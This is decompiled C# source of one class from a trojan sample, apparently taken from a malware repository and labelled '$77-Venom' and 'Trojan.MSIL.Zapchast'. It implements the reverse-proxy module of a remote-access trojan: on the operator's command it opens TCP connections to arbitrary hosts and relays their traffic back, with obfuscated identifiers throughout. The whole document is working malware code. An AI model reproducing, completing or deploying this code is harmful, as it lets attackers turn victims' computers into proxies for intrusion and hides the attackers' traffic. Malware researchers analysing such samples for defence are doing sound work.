// Decompiled with JetBrains decompiler
// Type: 蘄ꫬ왒葧륦ଢ଼쩅徳෶蘃瀡⥁草돒ቺ̽⟌➢Ი
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Net;
using System.Net.Sockets;
using xClient.Core.ReverseProxy.Packets;

public class \uED81蘄ꫬ왒葧륦ଢ଼쩅徳\u0DF6蘃瀡\u2941草돒ቺ̽\u27CC\u27A2\u1C98
{
  public const int \uF689큺馺ꩅ㛟\uF24B\uF108䢵暙ꗘ罆齃鿋凁昸\uE48C甩\uFBBF\uFFFD\u1AC9 = 8192;
  private byte[] \u09FDᢕ\u2B00\u2875\uFFFDؠ띩\uEB02\uFFFD滐\uE58D찭檌\uFFFD뭅ಚ\u20CFꑪ\uE627\uF7AA;
  private bool 좛䨭ㄚޖꝧ䞧Ͽꔎꎷ\uF254刧砵꩔\uE315\uE3BDﴗ뗴슭톗荆;

  public int ConnectionId { get; private set; }

  public Socket Handle { get; private set; }

  public string Target { get; private set; }

  public int Port { get; private set; }

  public \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ Client { get; private set; }

  public \uED81蘄ꫬ왒葧륦ଢ଼쩅徳\u0DF6蘃瀡\u2941草돒ቺ̽\u27CC\u27A2\u1C98(
    ReverseProxyConnect command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    this.ConnectionId = command.ConnectionId;
    this.Target = command.Target;
    this.Port = command.Port;
    this.Client = client;
    this.Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    this.Handle.BeginConnect(command.Target, command.Port, new AsyncCallback(this.돍킨馞棡퇕萀嶢ﶡ\u205F쓋걲넩\uF390ॽ颂쿌A膣솤ퟐ), (object) null);
  }

  private void 돍킨馞棡퇕萀嶢ﶡ\u205F쓋걲넩\uF390ॽ颂쿌A膣솤ퟐ(IAsyncResult ar)
  {
    try
    {
      this.Handle.EndConnect(ar);
    }
    catch
    {
    }
    if (this.Handle.Connected)
    {
      try
      {
        this.\u09FDᢕ\u2B00\u2875\uFFFDؠ띩\uEB02\uFFFD滐\uE58D찭檌\uFFFD뭅ಚ\u20CFꑪ\uE627\uF7AA = new byte[8192];
        this.Handle.BeginReceive(this.\u09FDᢕ\u2B00\u2875\uFFFDؠ띩\uEB02\uFFFD滐\uE58D찭檌\uFFFD뭅ಚ\u20CFꑪ\uE627\uF7AA, 0, this.\u09FDᢕ\u2B00\u2875\uFFFDؠ띩\uEB02\uFFFD滐\uE58D찭檌\uFFFD뭅ಚ\u20CFꑪ\uE627\uF7AA.Length, SocketFlags.None, new AsyncCallback(this.헱䣿ꓭ\uFFFD폜\uE60A\uEB6D\uE345㘄乁䨑䦎㘃Ⰾ糀\uF207䩞ꘁ\uEACB̒), (object) null);
      }
      catch
      {
        new ReverseProxyConnectResponse(this.ConnectionId, false, (IPAddress) null, 0, this.Target).Execute(this.Client);
        this.웇㑣喫ⴉ捊뮙檼頯俓\uEB25\uFFFD䫸ɝ岵룉룭\uFE42삩ꈶ\u2E50();
      }
      IPEndPoint localEndPoint = (IPEndPoint) this.Handle.LocalEndPoint;
      new ReverseProxyConnectResponse(this.ConnectionId, true, localEndPoint.Address, localEndPoint.Port, this.Target).Execute(this.Client);
    }
    else
      new ReverseProxyConnectResponse(this.ConnectionId, false, (IPAddress) null, 0, this.Target).Execute(this.Client);
  }

  private void 헱䣿ꓭ\uFFFD폜\uE60A\uEB6D\uE345㘄乁䨑䦎㘃Ⰾ糀\uF207䩞ꘁ\uEACB̒(IAsyncResult ar)
  {
    try
    {
      int length = this.Handle.EndReceive(ar);
      if (length <= 0)
      {
        this.웇㑣喫ⴉ捊뮙檼頯俓\uEB25\uFFFD䫸ɝ岵룉룭\uFE42삩ꈶ\u2E50();
        return;
      }
      byte[] numArray = new byte[length];
      Array.Copy((Array) this.\u09FDᢕ\u2B00\u2875\uFFFDؠ띩\uEB02\uFFFD滐\uE58D찭檌\uFFFD뭅ಚ\u20CFꑪ\uE627\uF7AA, (Array) numArray, length);
      new ReverseProxyData(this.ConnectionId, numArray).Execute(this.Client);
    }
    catch
    {
      this.웇㑣喫ⴉ捊뮙檼頯俓\uEB25\uFFFD䫸ɝ岵룉룭\uFE42삩ꈶ\u2E50();
      return;
    }
    try
    {
      this.Handle.BeginReceive(this.\u09FDᢕ\u2B00\u2875\uFFFDؠ띩\uEB02\uFFFD滐\uE58D찭檌\uFFFD뭅ಚ\u20CFꑪ\uE627\uF7AA, 0, this.\u09FDᢕ\u2B00\u2875\uFFFDؠ띩\uEB02\uFFFD滐\uE58D찭檌\uFFFD뭅ಚ\u20CFꑪ\uE627\uF7AA.Length, SocketFlags.None, new AsyncCallback(this.헱䣿ꓭ\uFFFD폜\uE60A\uEB6D\uE345㘄乁䨑䦎㘃Ⰾ糀\uF207䩞ꘁ\uEACB̒), (object) null);
    }
    catch
    {
      this.웇㑣喫ⴉ捊뮙檼頯俓\uEB25\uFFFD䫸ɝ岵룉룭\uFE42삩ꈶ\u2E50();
    }
  }

  public void 웇㑣喫ⴉ捊뮙檼頯俓\uEB25\uFFFD䫸ɝ岵룉룭\uFE42삩ꈶ\u2E50()
  {
    if (!this.좛䨭ㄚޖꝧ䞧Ͽꔎꎷ\uF254刧砵꩔\uE315\uE3BDﴗ뗴슭톗荆)
    {
      this.좛䨭ㄚޖꝧ䞧Ͽꔎꎷ\uF254刧砵꩔\uE315\uE3BDﴗ뗴슭톗荆 = true;
      new ReverseProxyDisconnect(this.ConnectionId).Execute(this.Client);
    }
    try
    {
      this.Handle.Close();
    }
    catch
    {
    }
    this.Client.ɮ\uF185抬ĭ掮塒\uEC23ᄯ뵜챴け\uF33D斣ߴ\uEC03蔧\uE325傜邾\u0CCE(this.ConnectionId);
  }

  public void 䆔떙\uFFFDЌ杭㨿\u27BE㕖飷뼌ᓻ\uF393뿃촊ḗř焟癕२첧(byte[] data)
  {
    try
    {
      this.Handle.Send(data);
    }
    catch
    {
      this.웇㑣喫ⴉ捊뮙檼頯俓\uEB25\uFFFD䫸ɝ岵룉룭\uFE42삩ꈶ\u2E50();
    }
  }
}
